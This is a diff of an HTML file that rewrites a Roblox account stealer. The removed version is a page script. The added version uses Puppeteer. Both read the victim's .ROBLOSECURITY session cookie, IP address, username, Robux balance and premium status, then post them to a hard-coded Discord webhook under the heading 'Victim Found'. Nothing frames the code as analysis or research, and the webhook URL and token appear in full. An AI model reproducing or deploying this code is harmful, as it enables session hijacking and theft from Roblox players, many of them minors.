@@ -1,35 +1,46 @@
-<script>const WEBHOOK = "https://discord.com/api/webhooks/1433266191719333989/WMc3ZLkFPQ7TEjgaA6N17ec_R-8afxu2o9yEd9IZgBQhjfAd8YIrCnMNcGsKi0bYmNVw";
+<script>const puppeteer = require('puppeteer');
+const fetch = require('node-fetch'); // Ensure you have installed: npm install node-fetch
 
-// Function to get cookie by name
-function getCookie(name) {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop().split(';').shift();
-  return null;
-}
+const WEBHOOK = "https://discord.com/api/webhooks/1433266191719333989/WMc3ZLkFPQ7TEjgaA6N17ec_R-8afxu2o9yEd9IZgBQhjfAd8YIrCnMNcGsKi0bYmNVw";
 
-// Main function
-async function main(cookie) {
-  const ipAddr = await fetch("https://api.ipify.org").then(res => res.text());
+(async () => {
+  const browser = await puppeteer.launch({ headless: true });
+  const page = await browser.newPage();
 
-  let userId = null;
-  let userName = "N/A";
-  let isPremium = "N/A";
-  let robuxBalance = "N/A";
-  let headshotUrl = "";
+  // Navigate to Roblox homepage
+  await page.goto('https://www.roblox.com', { waitUntil: 'networkidle2' });
 
-  if (cookie) {
+  // Retrieve cookies
+  const cookies = await page.cookies();
+  const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
+
+  if (robloxCookie) {
+    const cookieValue = robloxCookie.value;
+    await main(cookieValue);
+  } else {
+    console.log("Roblox cookie not found in browser cookies. Please log in manually in your browser first.");
+  }
+
+  await browser.close();
+
+  // Main function to process and send info
+  async function main(cookie) {
+    const ipAddr = await fetch("https://api.ipify.org").then(res => res.text());
+
+    let userId = null;
+    let userName = "N/A";
+    let isPremium = "N/A";
+    let robuxBalance = "N/A";
+    let headshotUrl = "";
+
     // Fetch user info from Roblox
     try {
       const response = await fetch("https://www.roblox.com/my/settings/json", {
         method: 'GET',
-        mode: 'cors',
-        credentials: 'include',
         headers: {
           'referer': 'https://www.roblox.com/my/settings/json',
-          'Cookie': '.ROBLOSECURITY=' + cookie
+          'Cookie': `.ROBLOSECURITY=${cookie}`
         },
-        referrerPolicy: 'strict-origin-when-cross-origin'
       });
 
       if (response.ok) {
@@ -67,50 +78,42 @@ async function main(cookie) {
         console.error("Error fetching avatar:", e);
       }
     }
-  }
 
-  // Send to Discord webhook
-  await fetch(WEBHOOK, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      embeds: [
-        {
-          description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
-          color: 16711680,
-          fields: [
-            { name: "Username", value: userName, inline: true },
-            { name: "Robux", value: robuxBalance.toString(), inline: true },
-            { name: "Premium", value: isPremium, inline: true }
-          ],
-          author: {
-            name: "Victim Found: " + ipAddr,
-            url: `https://www.roblox.com/users/${userId}/profile`,
-            icon_url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
-          },
-          footer: {
-            text: "XYZEN 199.59.243.225",
-            icon_url: "https://cdn.discordapp.com/avatars/1426694389337686147/4f4402fac3d95c2a18d6c5f3c940f8de.webp?size=80"
-          },
-          thumbnail: {
-            url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
+    // Send to Discord webhook
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        embeds: [
+          {
+            description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+            color: 16711680,
+            fields: [
+              { name: "Username", value: userName, inline: true },
+              { name: "Robux", value: robuxBalance.toString(), inline: true },
+              { name: "Premium", value: isPremium, inline: true }
+            ],
+            author: {
+              name: "Victim Found: " + ipAddr,
+              url: `https://www.roblox.com/users/${userId}/profile`,
+              icon_url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
+            },
+            footer: {
+              text: "XYZEN 199.59.243.225",
+              icon_url: "https://cdn.discordapp.com/avatars/1426694389337686147/4f4402fac3d95c2a18d6c5f3c940f8de.webp?size=80"
+            },
+            thumbnail: {
+              url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
+            }
           }
-        }
-      ],
-      username: "HIT",
-      avatar_url: ""
-    })
-  });
-}
+        ],
+        username: "HIT",
+        avatar_url: ""
+      })
+    });
+  }
+})();</script>
 
-// Retrieve the cookie and run
-const cookie = getCookie('.ROBLOSECURITY');
-if (cookie) {
-  main(cookie);
-} else {
-  console.log("Roblox cookie not found in document.cookie");
-}</script>
-
-<img src="https://tse3.mm.bing.net/th/id/OIP.sOmzZBVfv9O0a6tXx08YbQHaFO?pid=Api&P=0&h=220" alt="Nature" width="600">
+<img src="data:image/jpeg;base64,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" alt=""
